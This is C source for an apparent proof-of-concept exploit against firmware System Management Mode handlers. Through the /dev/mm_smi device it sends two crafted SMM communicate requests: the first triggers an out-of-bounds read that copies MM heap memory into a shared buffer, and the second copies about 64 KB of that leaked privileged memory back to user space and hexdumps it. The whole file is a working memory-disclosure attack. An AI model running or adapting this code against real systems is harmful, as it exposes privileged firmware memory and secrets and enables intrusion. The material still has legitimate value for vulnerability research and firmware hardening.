#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BUFFER_SIZE 0x10000 // 16 pages
#define DEVICE_PATH "/dev/mm_smi"

typedef struct {
  uint32_t data1;
  uint16_t data2;
  uint16_t data3;
  uint8_t data4[8];
} __attribute__((packed)) efi_guid_t;

typedef struct {
  efi_guid_t header_guid;
  uint64_t message_length;
  uint8_t data[];
} __attribute__((packed)) efi_smm_communicate_header_t;

typedef struct {
  uint64_t ns_buffer_size;
  uint64_t secure_buffer_offset;
  uint64_t status;
  uint8_t data[];
} __attribute__((packed)) comm_buffer_copy_to_ns_t;

typedef struct {
  uint64_t buffer_size;
  uint8_t data[];
} __attribute__((packed)) comm_buffer_copy_from_ns_t;

void hexdump(const void *data, size_t size) {
  const uint8_t *bytes = (const uint8_t *)data;
  for (size_t i = 0; i < size; i += 16) {
    printf("%08zx: ", i);

    for (size_t j = 0; j < 16; j++) {
      if (i + j < size) {
        printf("%02x ", bytes[i + j]);
      } else {
        printf("   ");
      }
      if (j == 7)
        printf(" ");
    }

    printf(" |");
    for (size_t j = 0; j < 16 && i + j < size; j++) {
      uint8_t c = bytes[i + j];
      printf("%c", (c >= 32 && c <= 126) ? c : '.');
    }
    printf("|\n");
  }
}

static efi_smm_communicate_header_t *
alloc_request(efi_guid_t guid, size_t data_size, size_t *total_size) {
  size_t cb_size = data_size;
  *total_size = sizeof(efi_smm_communicate_header_t) + cb_size;

  efi_smm_communicate_header_t *req = malloc(*total_size);
  if (!req) {
    perror("malloc");
    return NULL;
  }

  req->header_guid = guid;
  req->message_length = cb_size;
  return req;
}

static int send_ioctl(efi_smm_communicate_header_t *req) {
  int fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("open " DEVICE_PATH);
    return -1;
  }

  int ret = ioctl(fd, 0, req);
  if (ret < 0) {
    perror("ioctl");
  }

  close(fd);
  return ret;
}

int main(int argc, char *argv[]) {
  efi_smm_communicate_header_t *req;
  size_t total_size;
  int ret;

  // trigger OOB read to copy data from heap memory to SharedBuffer
  efi_guid_t copy_from_ns_guid = {
      .data1 = 0x6fe9225e,
      .data2 = 0x67f2,
      .data3 = 0x4efb,
      .data4 = {0xbc, 0xe0, 0xf1, 0x53, 0x06, 0x81, 0xb8, 0xf8}};

  req = alloc_request(copy_from_ns_guid,
                      sizeof(comm_buffer_copy_from_ns_t) + 256, &total_size);
  if (!req) {
    return 1;
  }

  comm_buffer_copy_from_ns_t *buf_from_ns =
      (comm_buffer_copy_from_ns_t *)req->data;
  buf_from_ns->buffer_size = BUFFER_SIZE;
  memset(buf_from_ns->data, 'B', 256);

  printf("triggering gHandlerTypeCopyFromNs MM handler\n");

  ret = send_ioctl(req);
  free(req);
  if (ret < 0) {
    return 1;
  }

  printf("gHandlerTypeCopyFromNs MM handler triggered\n");

  // copy data back to user from SharedBuffer
  // we will be able to leak 0x10000 - 0x100
  // bytes from the MM heap memory
  efi_guid_t copy_to_ns_guid = {
      .data1 = 0x2a7adc98,
      .data2 = 0x820e,
      .data3 = 0x4775,
      .data4 = {0xa1, 0x7d, 0x2f, 0x74, 0x1d, 0x55, 0xb6, 0x26}};

  req = alloc_request(copy_to_ns_guid,
                      sizeof(comm_buffer_copy_to_ns_t) + BUFFER_SIZE,
                      &total_size);
  if (!req) {
    return 1;
  }

  comm_buffer_copy_to_ns_t *buf_to_ns = (comm_buffer_copy_to_ns_t *)req->data;
  buf_to_ns->secure_buffer_offset = 0;
  buf_to_ns->ns_buffer_size = BUFFER_SIZE;
  memset(buf_to_ns->data, 'B', BUFFER_SIZE);

  printf("triggering gHandlerTypeCopyToNs MM handler\n");

  ret = send_ioctl(req);
  if (ret < 0) {
    free(req);
    return 1;
  }

  printf("gHandlerTypeCopyToNs MM handler triggered\n");

  printf("status=0x%lx\n", buf_to_ns->status);

  hexdump(buf_to_ns->data, BUFFER_SIZE);

  free(req);

  return 0;
}
